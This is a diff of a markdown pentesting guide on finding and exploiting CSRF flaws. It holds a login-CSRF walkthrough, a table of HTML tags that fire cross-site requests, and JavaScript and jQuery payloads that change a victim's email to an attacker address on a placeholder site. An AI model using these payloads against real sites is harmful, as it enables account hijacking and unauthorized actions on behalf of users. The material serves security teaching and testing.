@@ -1,5 +1,7 @@
 # Finding and exploiting CSRF vulnerabilities
 
+* Finding and exploiting `Cross-Site Request Forgery (CSRF)` vulnerabilities involves identifying unprotected state-changing actions and leveraging weak request validation to execute unauthorized operations on behalf of authenticated users.
+
 ## Finding CSRF vulnerabilities
 
 1. **Identify state-changing actions** within the web application that alter user data or perform important operations, such as modifying personal details, processing purchases, transferring funds, or executing any API requests that update server-side resources. These actions are potential targets for CSRF attacks.
@@ -65,7 +67,7 @@
 * Unlike traditional CSRF attacks that focus on unauthorized state changes, this variant manipulates user authentication, potentially leading to account hijacking, data exposure, or session-based tracking.
 * The attack follows these steps:
   1. The attacker pre-creates an account (e.g., `attacker@attacker.tbl`) on the targeted vulnerable website.
-  1. The attacker constructs a malicious webpage designed to force victims into logging into this account:
+  1. The attacker constructs a malicious webpage designed to force victims to log in to this account:
 
       ```html
       <form action="https://vulnerable.tbl/login" method="POST">
@@ -80,15 +82,16 @@
   1. When a user visits this page, their browser automatically submits the form, initiating a login request. If the server responds with:
 
       ```http
-      Set-Cookie: session=attacker_account_session_id; Secure; HttpOnly; Path=/
+      Set-Cookie: sessionId=attacker_account_session_id; Secure; HttpOnly; Path=/
       ```
 
       The browser overwrites the victim's existing session cookie with the attacker account's session.
 
+      > :older_man: The `Same-Origin Policy (SOP)` prevents JavaScript running in a given origin from accessing the content of a document loaded from a different origin. Technically, cross-origin requests are still possible, but JavaScript cannot read the responses. However, the browser continues to process them, including handling the `Set-Cookie` headers.
+
   1. Since the victim remains unaware of this manipulation, they may continue using the trusted application, believing they are still logged into their own account. However, all actions they perform are tied to the attacker's session.
 * This technique is particularly dangerous in applications where users store personal information, payment details, or sensitive messages, as any data entered while under the attacker's session will be accessible to them.
 * Attackers can also leverage this approach to track user interactions and harvest sensitive data, initiate fraudulent transactions using stored payment details, exploit account linking mechanisms to permanently associate the victim's actions with the attacker's controlled session.
-  > :older_man: However, there is a shift in behavior. Historically, the absence of the `SameSite` attribute on cookies was treated as `SameSite=None` by most browsers. Recognizing the security risks of this approach, modern browsers now default to `SameSite=Lax`, which would prevent this attack. Although this change enhances security, depending on browser defaults is not considered a reliable security practice.
 
 ## Common CSRF payloads
 
@@ -96,7 +99,7 @@
 
 |HTML tags|
 |:--:|
-|```<iframe src="https://vulnerable.tbl/email/update" />```,<br/> ```<script src="https://vulnerable.tbl/email/update" />```,<br/> ```<input type="image" src="https://vulnerable.tbl/email/update" alt="" />```,<br/> ```<embed src="https://vulnerable.tbl/email/update" />```,<br/> ```<audio src="https://vulnerable.tbl/email/update" />```,<br/> ```<video src="https://vulnerable.tbl/email/update" />```,<br/> ```<source src="https://vulnerable.tbl/email/update" />```,<br/> ```<video poster="https://vulnerable.tbl/email/update" />```,<br/> ```<link rel="stylesheet" href="https://vulnerable.tbl/email/update" />```,<br/> ```<object data="https://vulnerable.tbl/email/update" />```,<br/> ```<body background="https://vulnerable.tbl/email/update" />```,<br/> ```<div style="background:url("https://vulnerable.tbl/email/update")" />```,<br/> ```<style>body { background:url("https://vulnerable.tbl/email/update") } </style> />```|
+|```<iframe src="URL" />```,<br/> ```<script src="URL" />```,<br/> ```<input type="image" src="URL" alt="" />```,<br/> ```<embed src="URL" />```,<br/> ```<audio src="URL" />```,<br/> ```<video src="URL" />```,<br/> ```<source src="URL" />```,<br/> ```<video poster="URL" />```,<br/> ```<link rel="stylesheet" href="URL" />```,<br/> ```<object data="URL" />```,<br/> ```<body background="URL" />```,<br/> ```<div style="background:url("URL")" />```,<br/> ```<style>body { background:url("URL") } </style> />```|
 
 ### HTML and JavaScript not requiring user interaction
 
@@ -111,19 +114,19 @@
 
   ```javascript
   <script>
-  const url = "https://vulnerable.tbl/email/update";
-  const params = "email=attacker@attacker.tbl";
-  const CSRF = new XMLHttpRequest();
-  CSRF.open("POST", url, false);
-  CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-  CSRF.send(params);
+    const url = "https://vulnerable.tbl/email/update";
+    const params = "email=attacker@attacker.tbl";
+    const CSRF = new XMLHttpRequest();
+    CSRF.open("POST", url, false);
+    CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    CSRF.send(params);
   </script>
   ```
 
   ```javascript
   $.ajax({
-  type: "POST",
-  url: "https://vulnerable.tbl/email/update",
-  data: "email=attacker@attacker.tbl",
+    type: "POST",
+    url: "https://vulnerable.tbl/email/update",
+    data: "email=attacker@attacker.tbl",
   });
   ```
